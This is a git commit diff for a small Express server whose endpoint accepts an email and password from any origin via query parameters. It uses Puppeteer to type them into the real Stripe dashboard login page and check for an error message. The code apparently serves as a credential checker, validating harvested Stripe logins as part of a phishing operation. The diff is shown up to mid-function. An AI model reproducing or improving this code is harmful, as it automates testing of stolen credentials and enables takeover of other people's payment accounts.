046074754af6033ba425e423cd75f9b5cbc7fa2d
victor mak <thegreentechoffice@gmail.com>
2023-06-21 13:08:48 +0100

    Updated the app

--- index.js
+++ index.js
@@ -5,25 +5,26 @@ const cors = require("cors");
 const bodyParser = require("body-parser");
 const app = express()
 const PORT = process.env.PORT || 3000
-let jsonParser = bodyParser.json();
+let urlEncoded = bodyParser.urlencoded({extended: true});
 app.use(cors({
   origin: '*'
 }));
 
 
-app.get("/", (re, res) => {
+app.get("/", (req, res) => {
    res.send("Hello Server.js")
 });
 
 
-app.post("/verify", jsonParser, (req, res) => {
-const {email, password} = req.body;
+app.get("/view", urlEncoded, (req, res) => {
+ const {email, pass} = req.query;
+
 (async () => {
-  const browser = await puppeteer.launch({args:["--no-sandbox", "--disable-setuid-sandbox", "--single-process", "--no-zygote"] , executablePath: process.env.NODE_ENV === "production" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(), headless: "new"});
+  const browser = await puppeteer.launch({args:["--no-sandbox", "--disable-setuid-sandbox", "--single-process", "--no-zygote"] , executablePath: process.env.NODE_ENV === "production" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(), headless: false});
   const [page] = await browser.pages();
   await page.goto('https://dashboard.stripe.com/login');
   await page.locator("#email").fill(email)
-  await page.locator("#old-password").fill(password)
+  await page.locator("#old-password").fill(pass)
   await page.locator('body > div.db-Login-root.db-Login-root--v4 > div > div > div.db-RegisterAndLoginLayout.db-RegisterAndLoginLayout--login.db-RegisterAndLoginLayout--isMobile.Box-root.Flex-flex.Flex-direction--column > div.db-RegisterAndLoginLayout-contentWrapper.Box-root > div > div.Card-root.Card--radius--all.Card--shadow--large.db-RegisterAndLoginLayout-card.Box-root.Box-hideIfEmpty.Box-background--white > div > div > div > div > div > div > div:nth-child(2) > form > div > div > div > div:nth-child(4) > div > div > div > div > div > div.PressableCore-base.Box-root > button').click()
   await page.waitForSelector('.Text-color--red', {timeout: 3000}).then(() => {
     res.setHeader('Content-Type', 'application/json');
